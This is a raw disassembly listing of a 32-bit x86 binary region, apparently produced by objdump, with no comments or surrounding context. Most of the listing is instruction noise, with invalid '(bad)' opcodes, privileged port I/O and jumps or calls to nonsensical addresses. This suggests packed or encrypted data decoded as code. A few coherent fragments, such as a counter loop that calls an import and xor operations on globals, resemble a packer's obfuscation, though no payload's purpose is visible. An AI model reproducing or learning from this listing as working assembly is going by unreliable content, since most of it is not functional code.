  40da4a:	mov    ds:0xf8bd4a52,al
  40da4f:	les    ebp,FWORD PTR [eax+0x4eac471]
  40da55:	fcmovb st,st(3)
  40da57:	xchg   ebp,eax
  40da58:	leave  
  40da59:	mov    esp,0x353146e5
  40da5e:	xchg   ebp,eax
  40da5f:	inc    esi
  40da60:	dec    ecx
  40da61:	sbb    eax,0x3ea9e964
  40da66:	xor    bh,0xc2
  40da69:	enter  0x747a,0x30
  40da6d:	push   ds
  40da6e:	cpuid  
  40da70:	or     ebx,ebx
  40da72:	repz test al,0x3f
  40da75:	dec    ebp
  40da76:	lock or al,0x8b
  40da79:	stos   BYTE PTR es:[edi],al
  40da7a:	pushf  
  40da7b:	das    
  40da7c:	ficom  DWORD PTR [eax-0x4f74f516]
  40da82:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40da83:	dec    ax
  40da85:	mov    edx,0x5380ad7c
  40da8a:	ins    DWORD PTR es:[edi],dx
  40da8b:	retf   0x37d1
  40da8e:	ins    DWORD PTR es:[edi],dx
  40da8f:	int3   
  40da90:	or     eax,0x9bc262c9
  40da95:	rol    cl,0x48
  40da98:	fistp  QWORD PTR [edx-0x1]
  40da9b:	push   esi
  40da9c:	test   DWORD PTR [eax+0x7fedb657],ebp
  40daa2:	adc    DWORD PTR [edx+0x50],0x62cf5878
  40daa9:	cmp    al,0x3a
  40daab:	imul   ebp,esi,0x34
  40daae:	retf   0xf1d3
  40dab1:	mov    esp,0x9047ebb0
  40dab6:	mov    ebp,0x8479f52b
  40dabb:	call   0x5087df1f
  40dac0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dac1:	test   BYTE PTR [edx+0x6e69e1bc],ah
  40dac7:	mov    DWORD PTR fs:[ebx],edx
  40daca:	pop    esp
  40dacb:	jp     0x40da85
  40dacd:	pop    ss
  40dace:	mul    BYTE PTR ds:0x34eb94d6
  40dad5:	push   0xe9bbc700
  40dada:	in     al,0xc2
  40dadc:	cmp    esp,DWORD PTR [eax-0x713169b0]
  40dae2:	sub    BYTE PTR [ebx+0x65695437],al
  40dae8:	xchg   ebx,eax
  40dae9:	jo     0x40db1c
  40daeb:	out    0x6c,eax
  40daed:	fs push ss
  40daef:	fs pop es
  40daf1:	test   DWORD PTR [ecx-0x1c6c87df],0x915caaf6
  40dafb:	(bad)  
  40dafc:	ins    BYTE PTR es:[edi],dx
  40dafd:	sbb    ch,BYTE PTR ds:0x183fc709
  40db03:	mov    BYTE PTR [ebx],ah
  40db05:	mov    eax,0x4f3e2528
  40db0a:	add    al,0xfc
  40db0c:	mov    gs,WORD PTR ss:[ebp+0x60]
  40db10:	pop    esi
  40db11:	out    0xae,al
  40db13:	pop    ebx
  40db14:	pop    esp
  40db15:	cmp    ch,bl
  40db17:	enter  0xa69,0x0
  40db1b:	sti    
  40db1c:	inc    edi
  40db1d:	in     al,0x94
  40db1f:	call   DWORD PTR [eax+0x59f27239]
  40db25:	pop    ds
  40db26:	cdq    
  40db27:	iret   
  40db28:	jle    0x40dae2
  40db2a:	call   0xb97a2db7
  40db2f:	call   0x7fd2:0xa1668a7f
  40db36:	cmc    
  40db37:	(bad)
  40db3a:	add    esp,edi
  40db3c:	jne    0x40db04
  40db3e:	xchg   ebx,eax
  40db3f:	dec    esi
  40db40:	scas   eax,DWORD PTR es:[edi]
  40db41:	sar    dl,cl
  40db43:	cmp    eax,0xc273dab
  40db48:	dec    ebx
  40db49:	sbb    al,0x0
  40db4b:	xchg   ch,al
  40db4d:	xchg   ebx,eax
  40db4e:	xchg   esp,eax
  40db4f:	mov    bh,0x7a
  40db51:	int3   
  40db52:	fnsave [ebp+0x77]
  40db55:	and    al,0xd9
  40db57:	adc    DWORD PTR [eax+0x89233ef],0x7239e589
  40db61:	mov    ecx,0xae6e8d30
  40db66:	push   0xb3431bba
  40db6b:	cld    
  40db6c:	or     ebp,edx
  40db6e:	popa   
  40db6f:	mov    ds:0x1ede8371,al
  40db74:	and    cl,BYTE PTR [ebp-0x7852c677]
  40db7a:	jp     0x40db74
  40db7c:	and    ah,BYTE PTR [edx]
  40db7e:	outs   dx,DWORD PTR ds:[esi]
  40db7f:	jo     0x40dbc3
  40db81:	jo     0x40db45
  40db83:	or     DWORD PTR [ebx+eiz*4-0x11],edx
  40db87:	mov    WORD PTR [esi],gs
  40db89:	fwait
  40db8a:	dec    ebx
  40db8b:	xor    eax,0xbfba1d26
  40db90:	jmp    0x40db5d
  40db92:	sbb    ah,BYTE PTR [ecx-0x1cc8f4cc]
  40db98:	pop    ss
  40db99:	xor    ah,BYTE PTR [edx]
  40db9b:	cwde   
  40db9c:	idiv   BYTE PTR [ebx+0x7229a0a7]
  40dba2:	ins    BYTE PTR es:[edi],dx
  40dba3:	xor    eax,ecx
  40dba5:	loope  0x40db6c
  40dba7:	xchg   ecx,eax
  40dba8:	in     al,dx
  40dba9:	repnz xchg esi,eax
  40dbab:	pop    ss
  40dbac:	in     al,dx
  40dbad:	int    0xba
  40dbaf:	imul   ebp,DWORD PTR [eax*2+0x3b8b3f14],0xffffffc1
  40dbb7:	jne    0x40de3d
  40dbbd:	mov    eax,DWORD PTR [ebp-0x4]
  40dbc0:	xor    eax,edi
  40dbc2:	jmp    0x40de1f
  40dbc7:	mov    edi,0x5dc09dfd
  40dbcc:	loopne 0x40dc31
  40dbce:	adc    DWORD PTR [esi-0x64bfeba4],0xfaa126c1
  40dbd8:	sahf   
  40dbd9:	jle    0x40dc59
  40dbdb:	ds jl  0x40dc5c
  40dbde:	jle    0x40dbbf
  40dbe0:	lods   eax,DWORD PTR ds:[esi]
  40dbe1:	and    al,0xfe
  40dbe3:	leave  
  40dbe4:	mov    eax,0x784d5843
  40dbe9:	or     DWORD PTR ds:0x454150f0,ebp
  40dbef:	pop    ebx
  40dbf0:	psubw  mm5,QWORD PTR [ebp-0x43]
  40dbf4:	xchg   edi,eax
  40dbf5:	inc    esp
  40dbf6:	imul   esp,DWORD PTR [edx-0x74],0x2908a2f7
  40dbfd:	pop    ss
  40dbfe:	mov    cl,0x5
  40dc00:	xor    bh,ch
  40dc02:	fstp   DWORD PTR [ecx+ecx*8-0x56b687ab]
  40dc09:	in     eax,dx
  40dc0a:	daa    
  40dc0b:	sbb    al,0xe1
  40dc0d:	out    dx,al
  40dc0e:	jmp    0x19a25fd5
  40dc13:	rcl    DWORD PTR [ebx+0x57fe7dae],0x5e
  40dc1a:	test   eax,0x107604a2
  40dc1f:	cli    
  40dc20:	pause  
  40dc22:	and    eax,0x6c049571
  40dc27:	daa    
  40dc28:	xor    bl,bl
  40dc2a:	cmp    ebp,DWORD PTR [ecx+0x750fee4f]
  40dc30:	fcomp  DWORD PTR [ebx-0x6f]
  40dc33:	pop    esp
  40dc34:	push   ds
  40dc35:	mov    ah,0xfd
  40dc37:	shr    DWORD PTR [eax],1
  40dc39:	adc    DWORD PTR [edi+0x3d],esp
  40dc3c:	mov    ah,0x8d
  40dc3e:	xchg   ebp,eax
  40dc3f:	cwde   
  40dc40:	mov    esi,0x691d6efb
  40dc45:	pop    edi
  40dc46:	sbb    esp,DWORD PTR [ebx-0x2]
  40dc49:	xor    dl,BYTE PTR fs:[ebp+0x71]
  40dc4d:	out    dx,eax
  40dc4e:	sbb    al,0xe5
  40dc50:	mov    al,ds:0x49da911e
  40dc55:	dec    ebx
  40dc56:	aas    
  40dc57:	rol    eax,cl
  40dc59:	mov    edx,0xb504995
  40dc5e:	aas    
  40dc5f:	mov    ds:0x8435b0c4,al
  40dc64:	sub    al,0x90
  40dc66:	pop    ecx
  40dc67:	pop    ss
  40dc68:	ins    BYTE PTR es:[edi],dx
  40dc69:	lea    ebx,ds:0xbffb6584
  40dc6f:	pop    ebp
  40dc70:	std    
  40dc71:	mov    eax,ds:0x3904cdb
  40dc76:	fistp  QWORD PTR [eax]
  40dc78:	int3   
  40dc79:	push   esp
  40dc7a:	sub    bh,0xe3
  40dc7d:	xlat   BYTE PTR ds:[ebx]
  40dc7e:	pop    es
  40dc7f:	fcomp  QWORD PTR [ebx]
  40dc81:	jge    0x40dcf6
  40dc83:	dec    ecx
  40dc84:	(bad)  
  40dc85:	fst    QWORD PTR ds:0xc5bed03b
  40dc8b:	ss out dx,al
  40dc8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dc8e:	pop    eax
  40dc8f:	lock fld TBYTE PTR [edi+0x42d2e7dc]
  40dc96:	out    0x11,al
  40dc98:	icebp  
  40dc99:	mov    esi,0x9f4e86f1
  40dc9e:	test   eax,0x476aa83e
  40dca3:	and    DWORD PTR [eax+ebp*2],0xffffff97
  40dca7:	add    ch,ah
  40dca9:	cwde   
  40dcaa:	and    al,0x0
  40dcac:	mov    DWORD PTR [ecx+ebx*4],esi
  40dcaf:	stos   BYTE PTR es:[edi],al
  40dcb0:	imul   eax,DWORD PTR [edi],0x66
  40dcb3:	es pop esp
  40dcb5:	in     al,dx
  40dcb6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dcb7:	std    
  40dcb8:	adc    BYTE PTR [ebx-0x2a],dh
  40dcbb:	cmp    esp,esi
  40dcbd:	jle    0x40dd1f
  40dcbf:	cmc    
  40dcc0:	sar    BYTE PTR [edi],cl
  40dcc2:	loope  0x40dc99
  40dcc4:	add    DWORD PTR [ebx+0x5a],ecx
  40dcc7:	pop    ss
  40dcc8:	push   edx
  40dcc9:	nop
  40dcca:	ffree  st(7)
  40dccc:	dec    edx
  40dccd:	repnz in eax,0x74
  40dcd0:	bound  ebp,QWORD PTR [edi+0x3a]
  40dcd3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcd4:	fisubr DWORD PTR [ecx]
  40dcd6:	jne    0x40dc9d
  40dcd8:	fist   WORD PTR [esi-0x39e10c29]
  40dcde:	popa   
  40dcdf:	inc    esp
  40dce0:	pop    ds
  40dce1:	pop    ss
  40dce2:	fst    QWORD PTR [edi-0x61]
  40dce5:	add    al,BYTE PTR [esi-0x25c8d297]
  40dceb:	ret    0x4261
  40dcee:	adc    eax,0xe334816c
  40dcf3:	or     esp,edx
  40dcf5:	pop    ecx
  40dcf6:	shl    edx,0xdb
  40dcf9:	sub    al,bl
  40dcfb:	sar    BYTE PTR [edi],0xfd
  40dcfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcff:	jl     0x40dcf1
  40dd01:	(bad)  
  40dd02:	shl    BYTE PTR [ebx+eiz*1+0x679ddf21],cl
  40dd09:	imul   ebx,DWORD PTR [ecx],0x4d
  40dd0c:	sar    DWORD PTR [ecx+edi*2],cl
  40dd0f:	mov    ds:0xf218056b,al
  40dd14:	gs aas 
  40dd16:	int3   
  40dd17:	(bad)  
  40dd18:	dec    dx
  40dd1a:	mov    ?,WORD PTR [ebp-0x6ee61fd5]
  40dd20:	cld    
  40dd21:	shr    ah,1
  40dd23:	test   eax,0x789f2c3b
  40dd28:	mov    dl,0x73
  40dd2a:	xchg   ebx,eax
  40dd2b:	pop    edi
  40dd2c:	mov    bl,ah
  40dd2e:	(bad)  
  40dd30:	leave  
  40dd31:	int3   
  40dd32:	mov    edx,0x8e241692
  40dd37:	xor    DWORD PTR [ecx+esi*8],0x6ad9b643
  40dd3e:	xchg   ecx,eax
  40dd3f:	add    DWORD PTR [esi+0x8],0xffffffca
  40dd43:	fwait
  40dd44:	xor    eax,0x8ef566ee
  40dd49:	inc    edi
  40dd4a:	mov    ah,0x6e
  40dd4c:	arpl   di,si
  40dd4e:	(bad)  
  40dd50:	adc    DWORD PTR [esi],0x5c678f9e
  40dd56:	pop    ds
  40dd57:	ss inc esp
  40dd59:	in     eax,dx
  40dd5a:	dec    ebx
  40dd5b:	(bad)  
  40dd5c:	mov    ebx,0x5aea83b
  40dd61:	mov    esi,0xd570d68
  40dd66:	enter  0x9734,0x62
  40dd6a:	iret   
  40dd6b:	push   ecx
  40dd6c:	and    DWORD PTR [esi+0x2ca211ca],edx
  40dd72:	fscale 
  40dd74:	dec    eax
  40dd75:	or     ecx,DWORD PTR cs:[edx+0x478b4c]
  40dd7c:	push   es
  40dd7d:	hlt    
  40dd7e:	dec    ebx
  40dd7f:	sub    DWORD PTR [edx+0x7f135aa8],esi
  40dd85:	int3   
  40dd86:	call   0x467139c1
  40dd8b:	and    BYTE PTR [esi-0x60],0x4d
  40dd8f:	test   al,0x87
  40dd91:	xchg   edi,ebp
  40dd93:	stos   DWORD PTR es:[edi],eax
  40dd94:	out    dx,al
  40dd95:	shr    BYTE PTR [eax-0x9],cl
  40dd98:	or     BYTE PTR [ebx-0x58],al
  40dd9b:	out    0x3d,al
  40dd9d:	stos   BYTE PTR es:[edi],al
  40dd9e:	dec    edx
  40dd9f:	loopne 0x40de1d
  40dda1:	jg     0x40ddd0
  40dda3:	and    BYTE PTR [ebx],0x40
  40dda6:	(bad)  
  40dda7:	gs jo  0x40dd33
  40ddaa:	js     0x40dd67
  40ddac:	scas   al,BYTE PTR es:[edi]
  40ddad:	adc    edx,DWORD PTR [esi-0x5c]
  40ddb0:	iret   
  40ddb1:	xchg   ebx,eax
  40ddb2:	dec    eax
  40ddb3:	shl    DWORD PTR [ebx-0x4a7cf1df],1
  40ddb9:	out    0x47,eax
  40ddbb:	jmp    0xacc2:0xeff6a5b8
  40ddc2:	shl    DWORD PTR [edx-0x49d59936],cl
  40ddc8:	xchg   BYTE PTR [ebx+0x154f51e6],cl
  40ddce:	dec    esp
  40ddcf:	das    
  40ddd0:	jne    0x40dd52
  40ddd2:	loope  0x40de02
  40ddd4:	mov    eax,0xa6213bc6
  40ddd9:	or     ah,BYTE PTR [eax+0x3e225d6a]
  40dddf:	pop    ss
  40dde0:	shr    BYTE PTR [edi],1
  40dde2:	pop    esp
  40dde3:	cs int 0xcc
  40dde6:	xchg   edx,eax
  40dde7:	test   BYTE PTR [ecx+0x667f7f6b],0x5
  40ddee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ddef:	jge    0x40ddd8
  40ddf1:	pop    ebp
  40ddf2:	loope  0x40dd84
  40ddf4:	sahf   
  40ddf5:	ins    BYTE PTR es:[edi],dx
  40ddf6:	test   al,0xc
  40ddf8:	in     al,0x77
  40ddfa:	push   esi
  40ddfb:	rol    BYTE PTR [esi-0x33d69d14],0x23
  40de02:	inc    esp
  40de03:	and    al,dl
  40de05:	lods   al,BYTE PTR ds:[esi]
  40de06:	mov    bh,0xc4
  40de08:	rol    DWORD PTR [edi+0x41a565e],cl
  40de0e:	loopne 0x40de13
  40de10:	fwait
  40de11:	push   edi
  40de12:	mov    bh,0x7a
  40de14:	sub    BYTE PTR [ebp+0x1b],bl
  40de17:	rcl    DWORD PTR [edi],1
  40de19:	in     al,0x31
  40de1b:	mov    ch,0x41
  40de1d:	xchg   ecx,eax
  40de1e:	xor    eax,0xb8a3c603
  40de23:	cmp    eax,DWORD PTR [ecx+0x0]
  40de26:	mov    eax,DWORD PTR [ebp-0x4]
  40de29:	xor    eax,edi
  40de2b:	add    eax,esi
  40de2d:	mov    ds:0x413bb0,eax
  40de32:	push   DWORD PTR [ebp-0x8]
  40de35:	push   DWORD PTR [ebp-0x4]
  40de38:	call   0x40de4a
  40de3d:	mov    eax,DWORD PTR [ebp-0x4]
  40de40:	xor    eax,edi
  40de42:	pop    edi
  40de43:	add    eax,esi
  40de45:	pop    esi
  40de46:	leave  
  40de47:	ret    0xc
  40de4a:	push   ebp
  40de4b:	mov    ebp,esp
  40de4d:	sub    esp,0x60
  40de50:	and    DWORD PTR ds:0x43369f,0x0
  40de5a:	mov    eax,ds:0x43369f
  40de5f:	inc    eax
  40de60:	mov    ds:0x43369f,eax
  40de65:	cmp    DWORD PTR ds:0x43369f,0x27
  40de6c:	jne    0x40de7e
  40de72:	push   DWORD PTR [ebp-0xc]
  40de75:	push   DWORD PTR [ebp-0x10]
  40de78:	call   DWORD PTR ds:0x4120e8
  40de7e:	cmp    DWORD PTR ds:0x43369f,0x19
  40de85:	jb     0x40de5a
  40de8b:	xor    DWORD PTR ds:0x4336ef,0x6001
  40de95:	jmp    0x40dfce
  40de9a:	push   ecx
  40de9c:	inc    ebp
  40de9d:	jb     0x40df10
  40de9f:	jb     0x40de4a
  40dea1:	icebp  
  40dea2:	fisubr WORD PTR [esi]
  40dea4:	into   
  40dea5:	imul   DWORD PTR [esi]
  40dea7:	xor    al,0xc7
  40dea9:	push   ebx
  40deaa:	mov    edx,0x127e7e9c
  40deaf:	jg     0x40df2f
  40deb1:	jle    0x40de7f
  40deb3:	or     eax,0x1951fdbe
  40deb8:	and    al,0x3d
  40deba:	jp     0x40dede
  40debc:	les    ebp,FWORD PTR [eax-0x159665b1]
  40dec2:	inc    eax
  40dec3:	fsubr  QWORD PTR [ecx]
  40dec5:	cmp    BYTE PTR [ecx],ah
  40dec7:	sahf   
  40dec8:	sub    al,0xc8
  40deca:	or     eax,0x3a32ddd7
  40decf:	mov    WORD PTR [esp+ebp*2],fs
  40ded2:	jp     0x40debe
  40ded4:	in     eax,0xf7
  40ded6:	fisubr DWORD PTR [edx]
  40ded8:	push   0x17acbb94
  40dedd:	and    al,BYTE PTR [esi]
  40dedf:	mov    dh,BYTE PTR [edx+0x1afff835]
  40dee5:	push   ecx
  40dee6:	mov    esp,0x489c8faa
  40deeb:	mov    esp,0x8c89b04f
  40def0:	(bad)  
  40def1:	popa   
  40def2:	and    al,0x8d
  40def4:	mov    WORD PTR ds:[eax+0x76],gs
  40def8:	fcom   DWORD PTR [edx+0x62aeed08]
  40defe:	jmp    0x8158:0x572379f8
  40df05:	gs dec edx
  40df07:	enter  0x191a,0x7b
  40df0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40df0c:	and    ah,BYTE PTR [ebx]
  40df0e:	ret    0x86e1
  40df11:	or     cl,BYTE PTR [edi+edx*4-0x3b22c311]
  40df18:	fiadd  DWORD PTR [edx-0x69]
  40df1b:	or     al,0x60
  40df1d:	sahf   
  40df1e:	or     al,0x57
  40df20:	pop    esp
  40df21:	in     al,dx
  40df22:	and    bl,BYTE PTR [eax+0x6c9642b]
  40df28:	push   ebx
  40df29:	adc    cl,BYTE PTR [edi-0xe]
  40df2c:	cmp    eax,0x33f77e38
  40df31:	mov    al,ds:0x97071791
  40df36:	js     0x40ded2
  40df38:	cmp    esi,edi
  40df3a:	push   eax
  40df3b:	push   edx
  40df3c:	mov    bh,0x38
  40df3e:	and    esi,DWORD PTR [ebp+0x3dc9a0b9]
  40df44:	repnz sub al,0x15
  40df47:	out    0xc1,al
  40df49:	mov    al,0x86
  40df4b:	sti    
  40df4c:	sbb    eax,0x373e3da5
  40df51:	and    al,0xee
  40df53:	mov    ds,WORD PTR [ecx-0x41978e1]
  40df59:	xchg   ebx,eax
  40df5a:	ins    BYTE PTR es:[edi],dx
  40df5b:	mov    ch,0xe7
  40df5d:	test   al,0x42
  40df5f:	jg     0x40df61
  40df61:	add    dl,ah
  40df63:	fwait
  40df64:	add    bl,bl
  40df66:	pop    edi
  40df67:	sti    
  40df68:	xchg   esi,eax
  40df69:	hlt    
  40df6a:	or     BYTE PTR [ebx],dh
  40df6c:	dec    ecx
  40df6d:	jae    0x40df12
  40df6f:	bound  esp,QWORD PTR [ebp+0x53]
  40df72:	pop    DWORD PTR [ecx-0x14004f08]
  40df78:	xor    bh,BYTE PTR [edx+0x2f]
  40df7b:	or     eax,0x61aef6b
  40df80:	mov    esi,0x1fc843f4
  40df85:	or     eax,0x1a51622e
  40df8a:	sbb    BYTE PTR [esi+0xe8c318],ch
  40df90:	int    0xe9
  40df92:	sbb    DWORD PTR [esi],0x74d50297
  40df98:	pusha  
  40df99:	push   0x6e585bf7
  40df9e:	pop    es
  40df9f:	int3   
  40dfa0:	or     dl,BYTE PTR [ebx+0x2f]
  40dfa3:	outs   dx,DWORD PTR ds:[esi]
  40dfa4:	paddsb mm1,QWORD PTR [ecx-0x32]
  40dfa8:	mov    BYTE PTR ds:0xb9767473,ch
  40dfae:	js     0x40e011
  40dfb0:	(bad)  
  40dfb1:	out    dx,eax
  40dfb2:	push   cs
  40dfb3:	pop    esi
  40dfb4:	xlat   BYTE PTR ds:[ebx]
  40dfb5:	ja     0x40df80
  40dfb7:	scas   eax,DWORD PTR es:[edi]
  40dfb8:	cli    
  40dfb9:	gs dec ebp
  40dfbb:	retf   
  40dfbc:	je     0x40dfc4
  40dfbe:	icebp  
  40dfbf:	lock sbb al,0xf9
  40dfc2:	jle    0x40df60
  40dfc4:	ret    0xb540
  40dfc7:	cli    
  40dfc8:	pop    edx
  40dfc9:	pop    edi
  40dfca:	pop    esi
  40dfcb:	jl     0x40dfd6
  40dfcd:	ins    BYTE PTR es:[edi],dx
  40dfce:	mov    eax,DWORD PTR [ebp+0x8]
  40dfd1:	sub    DWORD PTR ds:0x433697,0x625
  40dfdb:	push   ebx
  40dfdc:	sub    DWORD PTR ds:0x4336eb,0x540f
  40dfe6:	push   esi
  40dfe7:	or     ebx,0x36b6
  40dfed:	mov    esi,0x7510854
  40dff2:	jmp    0x40e12b
  40dff7:	cmp    BYTE PTR [ebx-0x678ee5cf],dh
  40dffd:	shl    DWORD PTR [ecx+0x78],1
  40e000:	xor    esi,ecx
  40e002:	stos   BYTE PTR es:[edi],al
  40e003:	jbe    0x40e04d
  40e005:	in     al,0xa4
  40e007:	pop    esi
  40e008:	popf   
  40e009:	jle    0x40e089
  40e00b:	adc    bh,BYTE PTR [edi+0x7e]
  40e00e:	jle    0x40e024
  40e010:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e011:	fcomp  st(2)
  40e013:	jmp    0x40dfbb
  40e015:	mov    ebp,DWORD PTR [ecx]
  40e017:	sub    DWORD PTR [eax],edi
  40e019:	(bad)  
  40e01a:	stc    
  40e01b:	dec    edx
  40e01c:	and    cl,dh
  40e01e:	cmc    
  40e01f:	ficom  DWORD PTR [eiz*1-0x410cd79a]
  40e026:	popf   
  40e027:	fwait
  40e028:	jns    0x40e004
  40e02a:	stos   BYTE PTR es:[edi],al
  40e02b:	sub    eax,0x919fcab0
  40e030:	inc    ebp
  40e031:	dec    ecx
  40e032:	mov    ecx,DWORD PTR [eax]
  40e034:	out    0x1d,al
  40e036:	sbb    BYTE PTR [edx+ecx*8-0x37],ah
  40e03a:	int    0xd0
  40e03c:	pop    ebp
  40e03d:	push   ebx
  40e03e:	xchg   esi,eax
  40e03f:	cli    
  40e040:	ds es jmp 0x40e019
  40e044:	xchg   esp,eax
  40e045:	sbb    cl,al
  40e047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e048:	pop    ebx
  40e049:	sbb    DWORD PTR [ebx-0x1b],edi
  40e04c:	ds jnp 0x40e02a
  40e04f:	out    dx,eax
  40e050:	mov    bl,0x8c
  40e052:	addr16 xchg ebp,eax
  40e054:	jbe    0x40e06f
  40e056:	das    
  40e057:	xor    BYTE PTR [ebx-0x2f],0x34
  40e05b:	shl    DWORD PTR [edi-0x18c38bbe],cl
  40e061:	cdq    
  40e062:	adc    al,0x86
  40e064:	pushf  
  40e065:	dec    esi
  40e066:	es pop ds
  40e068:	jl     0x40e01b
  40e06a:	or     eax,0x1424dabf
  40e06f:	jbe    0x40e049
  40e071:	cwde   
  40e072:	psubusb mm3,QWORD PTR [ebp+ebx*1+0x15]
  40e077:	dec    ebp
  40e078:	push   ebx
  40e079:	lock xchg esp,eax
  40e07b:	arpl   ax,di
  40e07d:	fidiv  DWORD PTR [ebp-0x69]
  40e080:	stc    
  40e081:	xor    BYTE PTR [edx+0x51],bh
  40e084:	adc    esp,ecx
  40e086:	aad    0xa1
  40e088:	add    BYTE PTR [eax],al
  40e08a:	push   DWORD PTR [ebx]
  40e08c:	es (bad) 
  40e08e:	clc    
  40e08f:	mov    ch,0xe6
  40e091:	retf   
  40e092:	jo     0x40e09d
  40e094:	xchg   edi,eax
  40e095:	ins    BYTE PTR es:[edi],dx
  40e096:	jl     0x40e087
  40e098:	cmp    eax,0xb02c6b47
  40e09d:	ja     0x40e062
  40e09f:	sbb    edx,DWORD PTR [eax+0x12]
  40e0a2:	jle    0x40e074
  40e0a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0a5:	jecxz  0x40e120
  40e0a7:	pop    edi
  40e0a8:	push   edx
  40e0a9:	push   ds
  40e0aa:	inc    bx
  40e0ac:	lea    esi,[edx+eiz*4+0x21]
  40e0b0:	outs   dx,BYTE PTR ds:[esi]
  40e0b1:	push   0xffffffdd
  40e0b3:	add    BYTE PTR [eax-0x77c5b1b],cl
  40e0b9:	cdq    
  40e0ba:	shr    bl,cl
  40e0bc:	adc    bh,BYTE PTR [esi+edi*2-0x45614f31]
  40e0c3:	fisttp DWORD PTR [ecx-0x70]
  40e0c6:	mov    ebx,0xe6465b01
  40e0cb:	fstp   QWORD PTR [esi+0x37]
  40e0ce:	out    dx,al
  40e0cf:	repz ds dec edx
  40e0d2:	adc    BYTE PTR ds:0x7997ff82,0x16
  40e0d9:	adc    al,BYTE PTR [edi-0x43acd29a]
  40e0df:	push   es
  40e0e0:	jnp    0x40e0ed
  40e0e2:	jge    0x40e080
  40e0e4:	xchg   ebp,eax
  40e0e5:	or     ch,bh
  40e0e7:	fcomp  QWORD PTR fs:0x70268758
  40e0ee:	dec    edx
  40e0ef:	mov    WORD PTR [ebx+ecx*8-0x54af3e9f],ds
  40e0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e0f7:	xchg   ebx,eax
  40e0f8:	lea    esi,[edi]
  40e0fa:	push   cs
  40e0fb:	mov    edi,0xace84f55
  40e100:	int3   
  40e101:	ins    DWORD PTR es:[edi],dx
  40e102:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e103:	sub    ebx,ebp
  40e105:	fsubr  DWORD PTR ds:[ecx]
  40e108:	sbb    al,0xf7
  40e10a:	adc    edx,DWORD PTR [edi]
  40e10c:	push   ecx
  40e10d:	mov    ch,BYTE PTR [ebp-0x1a]
  40e110:	retf   0xa742
  40e113:	out    dx,eax
  40e114:	(bad)  
  40e115:	aad    0x62
  40e117:	ins    DWORD PTR es:[edi],dx
  40e118:	repnz shl DWORD PTR [eax-0x1a46129e],0xdd
  40e120:	ins    BYTE PTR es:[edi],dx
  40e121:	dec    ebp
  40e122:	mov    ss,WORD PTR [esi]
  40e124:	adc    DWORD PTR [edx+0x216be1d2],edx
  40e12a:	dec    eax
  40e12b:	xor    eax,esi
  40e12d:	adc    DWORD PTR ds:0x4336a3,0x2097
  40e137:	mov    ebx,0x32729b
  40e13c:	xor    DWORD PTR ds:0x4336ef,0x2259
  40e146:	add    eax,ebx
  40e148:	push   edi
  40e149:	jmp    0x40e282
  40e14e:	pop    ebx
  40e14f:	jecxz  0x40e12d
  40e151:	call   0x71acd2ba
  40e156:	and    ecx,DWORD PTR [eax]
  40e158:	out    0xd3,al
  40e15a:	push   eax
  40e15b:	adc    eax,0x9a726279
  40e160:	jle    0x40e1e0
  40e162:	adc    bh,BYTE PTR [edi+0x7e]
  40e165:	jle    0x40e114
  40e167:	mov    cl,0xd9
  40e169:	adc    bh,BYTE PTR [edx]
  40e16b:	xchg   ebp,ecx
  40e16d:	loop   0x40e152
  40e16f:	repnz add ch,cl
  40e172:	stos   BYTE PTR es:[edi],al
  40e173:	in     eax,dx
  40e174:	dec    esi
  40e175:	in     eax,dx
  40e176:	cmp    BYTE PTR [ebx],cl
  40e178:	xchg   al,bh
  40e17a:	push   esi
  40e17b:	iret   
  40e17c:	dec    esi
  40e17d:	idiv   DWORD PTR [ecx+eax*8-0x3b565531]
  40e184:	(bad)
  40e187:	add    edx,0xa4b1746b
  40e18d:	dec    esi
  40e18e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e18f:	(bad)  
  40e190:	sti    
  40e191:	ins    DWORD PTR es:[edi],dx
  40e192:	jmp    0x40e1ff
  40e194:	sbb    al,0xed
  40e196:	adc    esi,DWORD PTR [esi+0x75265565]
  40e19c:	sbb    al,BYTE PTR [ecx+ebp*8]
  40e19f:	fistp  DWORD PTR [ecx+0x21fc61dc]
  40e1a5:	out    0x1f,al
  40e1a7:	or     DWORD PTR [edx-0x66],esp
  40e1aa:	or     al,BYTE PTR [ebx-0xf674f56]
  40e1b0:	int3   
  40e1b1:	add    al,0xd2
  40e1b3:	mov    DWORD PTR [ebx+eax*8+0x5e7e5ad9],esp
  40e1ba:	fsubp  st(5),st
  40e1bc:	adc    ch,BYTE PTR [edx]
  40e1be:	sbb    DWORD PTR [edx],edx
  40e1c0:	push   es
  40e1c1:	jg     0x40e144
  40e1c3:	int3   
  40e1c4:	push   esp
  40e1c5:	cmp    al,0x7a
  40e1c7:	push   ss
  40e1c8:	cmc    
  40e1c9:	xor    DWORD PTR [edi+0x5b867a90],0x514671b6
  40e1d3:	fdivr  st,st(1)
  40e1d5:	fidiv  DWORD PTR [eax+ebx*8]
  40e1d8:	sbb    BYTE PTR [ebx],0xc8
  40e1db:	test   bh,0xd1
  40e1de:	dec    ebp
  40e1df:	jle    0x40e1d9
  40e1e1:	jge    0x40e192
  40e1e3:	int3   
  40e1e4:	sbb    DWORD PTR [edi-0x62],ebp
  40e1e7:	es jnp 0x40e247
  40e1ea:	jecxz  0x40e1bc
  40e1ec:	sub    ecx,ebp
  40e1ee:	aam    0x73
  40e1f0:	ds jns 0x40e24d
  40e1f3:	inc    edi
  40e1f4:	pop    es
  40e1f5:	fbstp  TBYTE PTR [esi+0x64c6144a]
  40e1fb:	repnz push 0xfffffff4
  40e1fe:	out    0xe6,eax
  40e200:	and    edi,DWORD PTR [edx-0xef94627]
  40e206:	jo     0x40e25b
  40e208:	shr    DWORD PTR [ecx-0x5654a6e0],1
